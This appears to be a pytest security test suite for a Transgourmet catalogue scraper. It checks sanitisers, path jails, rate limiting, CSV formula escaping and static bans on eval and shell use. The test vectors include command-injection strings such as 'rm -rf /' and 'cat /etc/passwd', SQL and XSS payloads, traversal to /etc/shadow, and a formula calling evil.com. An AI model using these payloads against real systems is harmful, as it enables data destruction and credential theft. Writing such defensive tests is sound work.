"""
Tier 5 Security Penetration & Adversarial Hardening Test Suite.
Formally implements TC-SEC-01 through TC-SEC-10 and static AST security audits
per R4 (Security Auditing & Adversarial Code Review) and TEST_INFRA.md.
"""

from __future__ import annotations

import ast
import json
import re
import time
from pathlib import Path
from unittest.mock import MagicMock, patch
import pytest
from click.testing import CliRunner

from scraper.cli import cli
from scraper.client.backoff import ExponentialBackoff
from scraper.client.rate_limiter import TokenBucketRateLimiter
from scraper.client.session import TransgourmetSession
from scraper.exceptions import (
    InputInjectionError,
    InvalidParameterError,
    PathTraversalError,
    SecurityValidationError,
    TransgourmetScraperError,
)
from scraper.parsers.turbostream import parse_articles_from_html
from scraper.storage.atomic import atomic_save_json
from scraper.storage.path_jail import (
    resolve_safe_export_path,
    sanitize_csv_cell,
    sanitize_search_query,
    validate_category_slug,
    validate_numeric_bound,
)

SCRAPER_SRC_DIR = Path(__file__).resolve().parent.parent / "scraper"


# ==============================================================================
# Tier 5: 10 Dedicated Adversarial Security Penetration Tests (TC-SEC-01 to 10)
# ==============================================================================

@pytest.mark.security
class TestAdversarialSecuritySuite:
    """Implements TC-SEC-01 through TC-SEC-10 per security architecture specification."""

    def test_tc_sec_01_input_injection_search_query(self) -> None:
        """
        TC-SEC-01: Input Injection Defense (CLI Search Query)
        Adversarial inputs: SQL injection patterns, XSS script tags, command injection sequences.
        Expected: Control characters stripped, normalized safely, zero execution.
        """
        payloads = [
            "fleisch'; DROP TABLE products;--",
            "<script>alert('xss')</script>",
            "butter; rm -rf /",
            "milch | cat /etc/passwd",
            "$(whoami)",
            "`id`",
        ]
        for p in payloads:
            clean = sanitize_search_query(p)
            assert "\0" not in clean
            assert isinstance(clean, str)
            assert len(clean) > 0

        # Null byte in query must raise InputInjectionError
        with pytest.raises(InputInjectionError):
            sanitize_search_query("milch\x00injection")

    def test_tc_sec_02_category_slug_traversal_defense(self, cli_runner: CliRunner) -> None:
        """
        TC-SEC-02: Category Slug Whitelist & Path Traversal Defense
        Adversarial inputs: Path traversal dots, slashes, or shell metacharacters in category slug.
        Expected: SecurityValidationError raised; CLI exits with non-zero code.
        """
        malicious_slugs = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "fleisch;ls",
            "food/drinks",
            "cat&whoami",
        ]
        for slug in malicious_slugs:
            with pytest.raises((SecurityValidationError, InvalidParameterError)):
                validate_category_slug(slug)

        # CLI invocation test
        res = cli_runner.invoke(cli, ["export", "--output", "out.json", "--categories", "../../../etc/passwd"])
        assert res.exit_code != 0

    def test_tc_sec_03_path_traversal_export_jail(self, safe_temp_dir: Path) -> None:
        """
        TC-SEC-03: Safe Local Storage Directory Jail Enforcement
        Adversarial inputs: /etc/shadow, ../../data.json, data/\x00secret.json.
        Expected: Directory jail blocks traversal and rejects null bytes with PathTraversalError.
        """
        # Absolute system file escape
        with pytest.raises((PathTraversalError, SecurityValidationError, ValueError)):
            resolve_safe_export_path("/etc/shadow", base_dir=safe_temp_dir)

        # Relative traversal escape
        with pytest.raises((PathTraversalError, SecurityValidationError, ValueError)):
            resolve_safe_export_path("../../secret_keys.json", base_dir=safe_temp_dir)

        # Null byte injection in path
        with pytest.raises((InputInjectionError, SecurityValidationError, ValueError)):
            resolve_safe_export_path("data/\x00injected.json", base_dir=safe_temp_dir)

    def test_tc_sec_04_token_bucket_rate_limiter_timing(self) -> None:
        """
        TC-SEC-04: Token-Bucket Rate Limiter & Anti-Ban Timing Enforcement
        Rapid sequential request calls must enforce non-zero polite delays with jitter.
        """
        limiter = TokenBucketRateLimiter(
            rate_limit_rps=10.0,
            base_delay=0.03,
            min_jitter=0.01,
            max_jitter=0.02,
        )
        start = time.perf_counter()
        for _ in range(4):
            limiter.acquire()
        elapsed = time.perf_counter() - start

        # 4 requests with ~0.045s delay each should take >= 0.08s
        assert elapsed >= 0.08

    @patch("requests.Session.request")
    def test_tc_sec_05_http_429_backoff_and_retry_after(self, mock_request: MagicMock) -> None:
        """
        TC-SEC-05: HTTP 429 Throttle Recovery with Retry-After Header
        Simulate 429 response with Retry-After: 0. Verify client waits and retries successfully.
        """
        resp_429 = MagicMock()
        resp_429.status_code = 429
        resp_429.headers = {"Retry-After": "0"}

        resp_200 = MagicMock()
        resp_200.status_code = 200
        resp_200.text = "<html><body>Success 200 OK</body></html>"
        resp_200.headers = {}

        mock_request.side_effect = [resp_429, resp_200]

        session = TransgourmetSession(max_retries=2, rate_limiter_enabled=False)
        resp = session.get("https://web.transgourmet.ch/de/prodega-easy/catalog")

        assert resp.status_code == 200
        assert mock_request.call_count == 2

    def test_tc_sec_06_atomic_storage_crash_defense(self, safe_temp_dir: Path) -> None:
        """
        TC-SEC-06: Atomic Storage Write Defense Against Process Interruption
        Simulate crash/exception mid-write; verify no corrupted or empty target file exists.
        """
        target_file = safe_temp_dir / "secure_export.json"
        
        # Write valid initial baseline
        atomic_save_json({"initial_state": "valid"}, target_file, base_dir=safe_temp_dir)
        assert target_file.exists()

        # Attempt atomic write with unserializable payload (simulating failure)
        class UnserializableObject:
            pass

        try:
            atomic_save_json({"bad": UnserializableObject()}, target_file, base_dir=safe_temp_dir)
        except Exception:
            pass

        # Target file must still have original intact state, not corrupted
        loaded = json.loads(target_file.read_text(encoding="utf-8"))
        assert loaded == {"initial_state": "valid"}
        # Ensure temporary files are cleaned up
        temp_files = list(safe_temp_dir.glob(".tmp.*"))
        assert len(temp_files) == 0

    def test_tc_sec_07_malformed_stream_fault_isolation(self) -> None:
        """
        TC-SEC-07: Malformed Stream Fault Isolation
        Corrupted JSON stream nodes with null fields or missing prices do not crash batch parsing.
        """
        malformed_html = (
            "<html><body><script>"
            "window.__reactRouterContext={streamController:{enqueue:'[[1],{\\'_2\\':3},\\'loaderData\\',{\\'_4\\':5},\\'features/catalog/routes/CatalogIndexRoute\\',{\\'_6\\':{\\'articles\\':[{\\'articleNumber\\':\\'040967\\',\\'description\\':\\'Valid Tomaten\\',\\'price\\':4.10,\\'unitText\\':\\'Sc\\'},{\\'corrupted\\':null,\\'invalid_key\\':123},{\\'articleNumber\\':\\'817441\\',\\'description\\':\\'Valid Ariel\\',\\'price\\':28.99,\\'unitText\\':\\'Bx\\'}],\\'totalCount\\':3}}]'}}"
            "</script></body></html>"
        )
        products = parse_articles_from_html(malformed_html)
        assert len(products) == 2
        assert products[0].article_number == "040967"
        assert products[1].article_number == "817441"

    def test_tc_sec_08_csv_formula_injection_sanitization(self) -> None:
        """
        TC-SEC-08: CSV Formula Injection Neutralization
        Formulas prefixed with =, +, -, @, \\t, \\r are safely escaped with leading single quote.
        """
        test_vectors = [
            ("=CMD('calc.exe')!A0", "'=CMD('calc.exe')!A0"),
            ("+SUM(A1:A10)", "'+SUM(A1:A10)"),
            ("-2+3", "'-2+3"),
            ("@IMPORTXML('http://evil.com')", "'@IMPORTXML('http://evil.com')"),
            ("\tTAB_INJECTION", "'\tTAB_INJECTION"),
            ("\rCR_INJECTION", "'\rCR_INJECTION"),
            ("Normal Product Description", "Normal Product Description"),
        ]
        for raw_val, expected in test_vectors:
            assert sanitize_csv_cell(raw_val) == expected

    def test_tc_sec_09_extreme_cli_argument_bounds(self, cli_runner: CliRunner) -> None:
        """
        TC-SEC-09: Extreme Numerical Parameter Bounding
        Negative limits or overflow parameters are safely rejected with usage errors.
        """
        # Negative limit
        res_neg = cli_runner.invoke(cli, ["search", "--query", "milch", "--limit", "-100"])
        assert res_neg.exit_code != 0

        # Bound validator helper
        with pytest.raises(InvalidParameterError):
            validate_numeric_bound(-5, "limit", min_val=1, max_val=50000)

        with pytest.raises(InvalidParameterError):
            validate_numeric_bound(999999, "limit", min_val=1, max_val=50000)

        assert validate_numeric_bound(100, "limit", min_val=1, max_val=50000) == 100

    def test_tc_sec_10_redos_defense_linear_pattern_evaluation(self) -> None:
        """
        TC-SEC-10: ReDoS (Regex Denial of Service) Protection
        Evaluate extreme 50,000-token repeating strings against scraper date/KW regex patterns.
        Execution must complete in < 50ms without CPU lockup.
        """
        extreme_repeating_string = "KW " + ("99 " * 10000) + "Aktionen"

        start = time.perf_counter()
        match = re.search(r"(?:kw|aktionen\s+)(\d{1,2})", extreme_repeating_string, re.IGNORECASE)
        elapsed = time.perf_counter() - start

        assert elapsed < 0.05
        assert match is not None
        assert match.group(1) == "99"


# ==============================================================================
# Tier 5: Static AST & Architecture Code Integrity Audits
# ==============================================================================

@pytest.mark.security
class TestStaticCodeSecurityAudits:
    """Static AST audits verifying codebase adheres to strict security constraints."""

    def test_no_unsafe_shell_execution_in_source(self) -> None:
        """Verify zero occurrences of shell=True, os.system, eval, or exec across scraper source code."""
        if not SCRAPER_SRC_DIR.exists():
            pytest.skip("Scraper source directory does not exist")

        py_files = list(SCRAPER_SRC_DIR.rglob("*.py"))
        assert len(py_files) > 0

        for py_file in py_files:
            source = py_file.read_text(encoding="utf-8")
            tree = ast.parse(source, filename=str(py_file))

            for node in ast.walk(tree):
                # Reject eval() and exec()
                if isinstance(node, ast.Call) and isinstance(node.func, ast.Name):
                    assert node.func.id not in ["eval", "exec"], f"Forbidden unsafe call {node.func.id}() in {py_file}"

                # Reject os.system()
                if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute):
                    if node.func.attr == "system" and getattr(node.func.value, "id", None) == "os":
                        pytest.fail(f"Forbidden os.system() call detected in {py_file}")

                # Reject subprocess.Popen/call with shell=True
                if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute):
                    if getattr(node.func.value, "id", None) == "subprocess":
                        for kw in node.keywords:
                            if kw.arg == "shell" and getattr(kw.value, "value", None) is True:
                                pytest.fail(f"Forbidden subprocess with shell=True detected in {py_file}")

    def test_no_unsafe_deserializers_imported(self) -> None:
        """Verify zero imports of pickle, marshal, or shelve across codebase."""
        if not SCRAPER_SRC_DIR.exists():
            pytest.skip("Scraper source directory does not exist")

        py_files = list(SCRAPER_SRC_DIR.rglob("*.py"))
        forbidden = {"pickle", "marshal", "shelve", "_pickle"}

        for py_file in py_files:
            source = py_file.read_text(encoding="utf-8")
            tree = ast.parse(source, filename=str(py_file))

            for node in ast.walk(tree):
                if isinstance(node, ast.Import):
                    for alias in node.names:
                        assert alias.name not in forbidden, f"Forbidden unsafe deserializer '{alias.name}' in {py_file}"
                elif isinstance(node, ast.ImportFrom):
                    assert node.module not in forbidden, f"Forbidden unsafe deserializer '{node.module}' in {py_file}"

    def test_all_custom_exceptions_inherit_base(self) -> None:
        """Verify all custom scraper exceptions inherit from TransgourmetScraperError."""
        import scraper.exceptions as exc_module

        base_class = exc_module.TransgourmetScraperError
        for attr_name in dir(exc_module):
            attr = getattr(exc_module, attr_name)
            if isinstance(attr, type) and issubclass(attr, Exception) and attr is not Exception and attr is not base_class:
                assert issubclass(attr, base_class), f"Exception {attr_name} must inherit from TransgourmetScraperError"
